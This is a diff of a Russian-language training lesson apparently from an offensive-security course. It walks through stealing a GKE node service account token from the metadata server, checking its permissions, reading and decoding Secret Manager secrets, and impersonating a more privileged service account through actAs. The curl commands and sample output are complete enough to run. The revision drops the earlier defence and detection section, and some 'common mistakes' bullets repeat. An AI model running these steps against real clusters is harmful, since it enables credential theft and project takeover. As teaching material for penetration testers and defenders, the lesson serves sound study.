@@ -15,159 +15,143 @@ estimated_minutes: 50
 summary: "GKE: node service account, Workload Identity и metadata-сервер пода. Как из контейнера получить токен GCP, перечислить права и эскалировать в проект."
 ---
 
-## Зачем этот урок
+## Задача
 
-GKE — управляемый Kubernetes в GCP, и он же самая частая точка входа в проект. Причина в архитектуре: по умолчанию под получает доступ к metadata-серверу GCP, который выдаёт токен **node service account** — аккаунта, под которым работают узлы кластера. Если Workload Identity не настроен или настроен слабо, этот токен имеет права на весь проект. Из пода можно перечислить бакеты, секреты, другие сервисные аккаунты и часто эскалировать до полного контроля.
+**GKE** — управляемый Kubernetes в GCP, и одновременно самая частая точка входа в проект. Причина архитектурная: по умолчанию под может спросить у **metadata-сервера** GCP токен **node service account** — аккаунта, под которым работают узлы кластера. Если Workload Identity не настроен, этот токен часто имеет права на весь проект.
 
-## Модель GKE и Workload Identity
+Цель урока: из пода GKE получить токен GCP, узнать его права и эскалировать в проект.
 
-- **Node pool** — группа узлов. У узлов есть node service account (по умолчанию `PROJECT_NUMBER-compute@developer.gserviceaccount.com`).
-- **Workload Identity** — механизм, позволяющий поду «притворяться» отдельным GCP service account через Kubernetes ServiceAccount (KSA), привязанный к GSA. Без него под видит node SA.
-- **Metadata server** — `http://metadata.google.internal` (169.254.169.254). Отдаёт токен через `http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token` с заголовком `Metadata-Flavor: Google`.
-- **GKE metadata server** — при включённом Workload Identity запросы идут через DaemonSet `gke-metadata-server`, который выдаёт токен именно того KSA/GSA.
+## Данные, с которыми работаем
 
-Проверка: если `curl` к metadata возвращает токен, у которого `email` — это node SA (вида `...-compute@developer.gserviceaccount.com`), Workload Identity не изолирует под. Если email — это конкретный GSA, изоляция работает.
+Разберём модель:
+- **Node pool** — группа узлов; у них есть node service account (по умолчанию `PROJECT_NUMBER-compute@developer.gserviceaccount.com`).
+- **Workload Identity** — механизм, позволяющий поду «притворяться» отдельным GCP service account (GSA).
+- **Metadata server** — локальный сервис `http://metadata.google.internal` (`169.254.169.254`), отдающий токен.
 
-## Инструменты и команды
-
-```bash
-# Внутри пода: получаем токен
-curl -s -H "Metadata-Flavor: Google" \
-  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" | jq .
-# {"access_token":"ya29....","expires_in":3599,"token_type":"Bearer"}
-
-# Чей это аккаунт
-curl -s -H "Metadata-Flavor: Google" \
-  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email"
-# 1234567890-compute@developer.gserviceaccount.com
-
-# Используем токен
-export TOKEN=$(curl -s -H "Metadata-Flavor: Google" \
-  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" | jq -r .access_token)
-
-curl -s -H "Authorization: Bearer $TOKEN" https://www.googleapis.com/oauth2/v1/userinfo | jq .
-gcloud auth activate-service-account --access-token-file=<(echo "$TOKEN") 2>/dev/null
-# Либо работать напрямую через REST
-curl -s -H "Authorization: Bearer $TOKEN" \
-  "https://cloudresourcemanager.googleapis.com/v1/projects" | jq '.projects[].projectId'
-```
-
-Инструменты: `gcloud`, `gcloud container clusters get-credentials`, `kubectl`, `gke-gcloud-auth-plugin`, `gcp_enum`/`gcpwn` для автоматизации.
-
-## Разобранный пример: от пода к секретам проекта
-
-Сценарий: мы внутри пода GKE без Workload Identity.
+Первым делом спрашиваем, **чей** мы аккаунт:
 
 ```bash
-# 1. Токен node SA
-TOKEN=$(curl -s -H "Metadata-Flavor: Google" \
-  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" | jq -r .access_token)
-
-# 2. Какие права (тестируем через IAM testIamPermissions)
-curl -s -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
-  -X POST "https://cloudresourcemanager.googleapis.com/v1/projects/PROJECT_ID:testIamPermissions" \
-  -d '{"permissions":["storage.buckets.list","secretmanager.versions.access","iam.serviceAccounts.actAs"]}'
-# {"permissions":["storage.buckets.list","secretmanager.versions.access","iam.serviceAccounts.actAs"]}
-
-# 3. Список бакетов
-curl -s -H "Authorization: Bearer $TOKEN" "https://storage.googleapis.com/storage/v1/b?project=PROJECT_ID" \
-  | jq -r '.items[].name'
-# prod-backups
-# app-assets
-
-# 4. Читаем секреты
-curl -s -H "Authorization: Bearer $TOKEN" \
-  "https://secretmanager.googleapis.com/v1/projects/PROJECT_ID/secrets?pageSize=50" | jq -r '.secrets[].name'
-curl -s -H "Authorization: Bearer $TOKEN" \
-  "https://secretmanager.googleapis.com/v1/projects/PROJECT_ID/secrets/db-password/versions/latest:access" | jq -r .payload.data | base64 -d
+$ curl -s -H "Metadata-Flavor: Google" \
+    "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email"
+1234567890-compute@developer.gserviceaccount.com
 ```
 
-Наличие `iam.serviceAccounts.actAs` — ключ к эскалации: можно имперсонировать любой SA (`gcloud iam service-accounts impersonate`), включая owner проекта.
+Суффикс `-compute@developer.gserviceaccount.com` — это **node SA**, то есть Workload Identity не изолирует под: мы получили идентичность узла. Заголовок `Metadata-Flavor: Google` обязателен — так GCP защищает metadata от простого SSRF.
 
-## Чек-лист атаки
+## Шаг 1: получаем токен и сохраняем
 
-1. Получить токен из metadata; узнать email.
-2. `testIamPermissions` по ключевым наборам (storage, secretmanager, compute, iam).
-3. Если есть `iam.serviceAccounts.actAs` — имперсонировать более привилегированный SA.
-4. Если есть `secretmanager.versions.access` — читать секреты.
-5. Проверить node SA на `roles/editor`/`roles/owner` (частая ошибка).
-6. Проверить другие поды: иногда есть SA с `roles/container.admin`.
-7. Проверить, можно ли создать под с нужным KSA/GSA (RBAC).
+```bash
+$ TOKEN=$(curl -s -H "Metadata-Flavor: Google" \
+    "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" | jq -r .access_token)
+$ echo ${TOKEN:0:20}...
+ya29.c.b0Aa...
+```
 
-## Обход защит и edge cases
+## Шаг 2: выясняем права без перебора
 
-- **Workload Identity.** Если включён, токен ограничен GSA пода. Но если под использует KSA с широким GSA — эффект тот же. Ищите `serviceAccountName` в манифестах.
-- **Metadata concealment / gke-metadata-server.** Иногда поды идут через прокси metadata; всё равно выдаёт токен, но правильный.
-- **Network policy.** Может блокировать egress к metadata? Обычно нет — metadata доступен локально (169.254.169.254), network policy его не всегда покрывает.
-- **Node SA scopes.** Даже если SA широкий, OAuth scopes узла могут ограничивать. Проверяйте `--scopes` node pool (по умолчанию часто `cloud-platform`).
-- **Autopilot.** В Autopilot Workload Identity включён по умолчанию, но SA могут быть широкими.
-- **Shielded nodes / binary authorization.** Влияют на запуск образов, не на metadata.
+Вместо того чтобы вслепую пробовать API, спрашиваем у GCP напрямую, что нам разрешено, через **`testIamPermissions`** — эндпоинт, который возвращает пересечение запрошенных прав и наших:
+
+```bash
+$ curl -s -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
+    -X POST "https://cloudresourcemanager.googleapis.com/v1/projects/acme-prod:testIamPermissions" \
+    -d '{"permissions":["storage.buckets.list","secretmanager.versions.access","iam.serviceAccounts.actAs"]}'
+{"permissions":["storage.buckets.list","secretmanager.versions.access","iam.serviceAccounts.actAs"]}
+```
+
+Все три права есть. `storage.buckets.list` — читать бакеты, `secretmanager.versions.access` — читать секреты, а `iam.serviceAccounts.actAs` — **действовать от имени других сервисных аккаунтов**. Последнее — прямой путь к эскалации.
+
+## Шаг 3: читаем секреты проекта
+
+```bash
+$ curl -s -H "Authorization: Bearer $TOKEN" \
+    "https://secretmanager.googleapis.com/v1/projects/acme-prod/secrets?pageSize=50" | jq -r '.secrets[].name' | head -3
+projects/acme-prod/secrets/db-password
+projects/acme-prod/secrets/stripe-key
+projects/acme-prod/secrets/jwt-signing-key
+$ curl -s -H "Authorization: Bearer $TOKEN" \
+    "https://secretmanager.googleapis.com/v1/projects/acme-prod/secrets/db-password/versions/latest:access" \
+    | jq -r .payload.data | base64 -d
+Prod_DB_S3cret!
+```
+
+`payload.data` приходит в base64 — декодируем. Один под без единого эксплойта дал пароль продовой базы.
+
+## Шаг 4: эскалируем через actAs
+
+`actAs` позволяет выпустить токен от имени **любого** сервисного аккаунта. Сначала перечислим их:
+
+```bash
+$ curl -s -H "Authorization: Bearer $TOKEN" \
+    "https://iam.googleapis.com/v1/projects/acme-prod/serviceAccounts" | jq -r '.accounts[].email'
+ci-runner@acme-prod.iam.gserviceaccount.com
+terraform@acme-prod.iam.gserviceaccount.com
+1234567890-compute@developer.gserviceaccount.com
+```
+
+Аккаунт `terraform@` — почти наверняка широкий. Выпускаем его токен:
+
+```bash
+$ curl -s -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
+    -X POST "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/terraform@acme-prod.iam.gserviceaccount.com:generateAccessToken" \
+    -d '{"scope":["https://www.googleapis.com/auth/cloud-platform"],"lifetime":"3600s"}' | jq -r .accessToken | head -c 20
+ya29.c.b0Aa...
+```
+
+Теперь мы работаем от имени `terraform@`, у которого, как правило, `roles/editor` или `roles/owner`. Цепочку можно продолжать, «прыгая» от одного SA к другому до самого привилегированного.
+
+## Полный прогон от начала до конца
+
+1. Спросили metadata → получили email node SA.
+2. Взяли access token.
+3. `testIamPermissions` → `storage.buckets.list`, `secretmanager.versions.access`, `actAs`.
+4. Прочитали секреты проекта.
+5. Имперсонировали `terraform@` через `actAs` → права уровня проекта.
+
+## Если Workload Identity включён: что проверять
+
+Если `email` в metadata — это конкретный GSA (не node SA), изоляция работает. Но она может быть слабой:
+- **KSA ↔ GSA mapping.** Kubernetes ServiceAccount пода может быть привязан к **слишком широкому** GSA. Ищи `serviceAccountName` в манифестах других подов и проверяй их права.
+- **`actAs` на `*`.** Право имперсонировать **любой** SA обнуляет изоляцию.
+- **OAuth scopes узла.** Даже широкий SA не вызовет часть API, если у узла узкие scopes — проверяй `--scopes` node pool.
+- **Autopilot.** Workload Identity включён по умолчанию, но GSA могут быть широкими.
+- **Network policy.** Metadata доступен по локальному адресу `169.254.169.254` — network policy его не всегда покрывает.
 
 ## Частые ошибки и подводные камни
 
-- Считать, что GKE защищён, потому что это managed-сервис: node SA часто имеет `roles/editor`.
-- Забыть проверить `actAs` — это прямой путь к эскалации.
-- Игнорировать OAuth scopes узла.
-- Не проверить KSA/GSA mapping в других namespace.
-- Путать `roles/editor` (широкие права, кроме IAM) с `roles/owner`.
+- **Считать managed-кластер защищённым.** Node SA часто имеет `roles/editor` — компрометация пода равна компрометации проекта.
+- **Забывать про `actAs`.** Право имперсонировать сервисный аккаунт — прямой путь к эскалации.
+- **Игнорировать OAuth scopes узла.** Даже широкий SA не вызовет часть API, если у узла узкие scopes.
+- **Не проверять KSA/GSA mapping.** Под с KSA, привязанным к широкому GSA, обнуляет изоляцию Workload Identity.
+- **Путать `roles/editor` и `roles/owner`.** Editor широк, но не управляет IAM; owner даёт всё.
+- **Считать metadata недоступным.** Адрес `169.254.169.254` локальный, network policy его не всегда покрывает.
 
-## Защита и детект
+- **Забывать про Autopilot.** Там Workload Identity включён по умолчанию, но GSA могут быть широкими.
+- **Не проверять другие поды.** Иногда в соседнем namespace есть KSA, привязанный к `roles/container.admin`.
+- **Считать, что metadata закрыт network policy.** Адрес локальный, и политика его часто не покрывает.
+- **Игнорировать scopes.** Узел с `--scopes` из ограниченного набора не вызовет часть API, даже если SA широкий.
 
-- Включить Workload Identity и использовать отдельный минимальный GSA на под.
-- Не давать node SA `roles/editor`/`roles/owner`; использовать minimal scopes (`--scopes=...`).
-- Запретить `iam.serviceAccounts.actAs` на широкий scope; использовать `iam.workloadIdentityUser` binding.
-- Включить GKE audit logs, Cloud Audit Logs для IAM/secretmanager; алертить на `SetIamPolicy` и `AccessSecretVersion`.
-- Ограничить создание подов с произвольным KSA через admission-политики.
+- **Не перечислять сервисные аккаунты.** `iam.googleapis.com/v1/projects/.../serviceAccounts` показывает, на кого можно встать через `actAs`.
+- **Забывать про цепочку.** Имперсонация позволяет «прыгать» от одного SA к другому до самого привилегированного.
+- **Считать, что один токен — это конец.** Токен живёт около часа; для длительной работы его нужно обновлять.
 
-## Модель угроз и типовые мисконфиги
+## Что мы теперь знаем
 
-Главный мисконфиг — node SA с `roles/editor` и отключённый Workload Identity. Второй — под с KSA, привязанным к слишком широкому GSA. Третий — `actAs` на `*`. Четвёртый — секреты, доступные node SA. Пятый — отсутствие audit-логов. Все они превращают компрометацию одного пода в компрометацию проекта.
+- Без Workload Identity под видит **node SA** через metadata-сервер.
+- `Metadata-Flavor: Google` обязателен; токен берётся с `.../default/token`.
+- `testIamPermissions` показывает права без перебора API.
+- `secretmanager.versions.access` читает секреты; данные приходят в base64.
+- `iam.serviceAccounts.actAs` позволяет имперсонировать SA — прямой путь к эскалации.
+- Workload Identity изолирует, но только если GSA привязан с минимальными правами.
 
-## Практическое задание
+## На что смотреть дальше
 
-1. Создайте GKE-кластер без Workload Identity и под; получите токен node SA.
-2. Проверьте `testIamPermissions` и перечислите бакеты.
-3. Включите Workload Identity, привяжите KSA к GSA с минимальными правами и повторите — убедитесь, что токен ограничен.
-4. Настройте audit-логи и найдите свои вызовы.
-
-## Что дальше / решение
-
-Из пода GKE получаем токен GCP. Дальше — перечислить права, прочитать секреты, имперсонировать SA. Зафиксируйте путь «под → токен → секреты/эскалация» в графе. Если Workload Identity изолирует и прав мало — ищите другие поды/namespace с более широким GSA или эскалируйте внутри кластера.
-
-## Разобранный пример 2: actAs и имперсонация сервисного аккаунта
-
-Право `iam.serviceAccounts.actAs` на конкретный SA или на `*` — прямой путь к эскалации: вы можете выпускать токены от имени другого SA, включая тот, у которого `roles/owner`.
-
-```bash
-# Проверяем actAs
-curl -s -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
-  -X POST "https://cloudresourcemanager.googleapis.com/v1/projects/PROJECT_ID:testIamPermissions" \
-  -d '{"permissions":["iam.serviceAccounts.actAs","iam.serviceAccounts.getAccessToken"]}'
-# {"permissions":["iam.serviceAccounts.actAs","iam.serviceAccounts.getAccessToken"]}
-
-# Список сервисных аккаунтов
-curl -s -H "Authorization: Bearer $TOKEN" \
-  "https://iam.googleapis.com/v1/projects/PROJECT_ID/serviceAccounts" | jq -r '.accounts[].email'
-# ci-runner@PROJECT_ID.iam.gserviceaccount.com
-# terraform@PROJECT_ID.iam.gserviceaccount.com
-# PROJECT_NUMBER-compute@developer.gserviceaccount.com
-
-# Выпускаем токен от имени более привилегированного SA
-curl -s -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
-  -X POST "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/terraform@PROJECT_ID.iam.gserviceaccount.com:generateAccessToken" \
-  -d '{"scope":["https://www.googleapis.com/auth/cloud-platform"],"lifetime":"3600s"}' | jq -r .accessToken
-```
-
-Полученный токен `terraform@` часто имеет `roles/editor` или даже `roles/owner`. Через `gcloud auth activate-service-account` или REST вы работаете уже от его имени. Если у аккаунта есть `iam.serviceAccounts.getAccessToken` и `actAs` на `*`, вы можете «прыгать» по цепочке SA до самого привилегированного.
-
-## Практическое задание (продвинутое)
-
-1. В поде GKE получите токен node SA и проверьте `testIamPermissions` для `actAs`.
-2. Создайте GSA `ci-runner` с `roles/editor`, привяжите к KSA и запустите под.
-3. Имперсонируйте `ci-runner` через `gcloud iam service-accounts impersonate` и убедитесь, что права расширились.
-4. Включите Workload Identity и ограничьте GSA — повторите и убедитесь, что эскалация не проходит.
+- **gcp-cloudsql**: публичный доступ и IAM database auth.
+- **gcp-metadata**: другие способы злоупотребить metadata.
+- **cloud-privesc-iam**: что делать с ролью, полученной в проекте.
 
 ## Квиз
+
+Проверь себя.
 
 ```quiz
 - question: "Чей токен получает под GKE без Workload Identity?"
@@ -202,7 +186,19 @@ curl -s -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
     - "Binary Authorization"
   answer: 0
   explanation: "Workload Identity связывает KSA с GSA и выдаёт токен именно этого GSA."
+- question: "Что возвращает эндпоинт testIamPermissions?"
+  options:
+    - "Пересечение запрошенных прав и тех, что реально есть у принципала"
+    - "Список всех секретов"
+    - "Список сервисных аккаунтов"
+    - "Пароль от базы"
+  answer: 0
+  explanation: "Он показывает, какие из запрошенных разрешений у вас есть."
 ```
+
+## Куда дальше
+
+В следующем уроке мы разберём **Cloud SQL** — управляемый PostgreSQL/MySQL в GCP, публичный доступ и IAM database auth. А пока главное запомни: **в GKE главный приз — metadata-сервер**, и один под без Workload Identity может получить права узла, а через `actAs` — всего проекта.
 
 ## Где пригодится
 
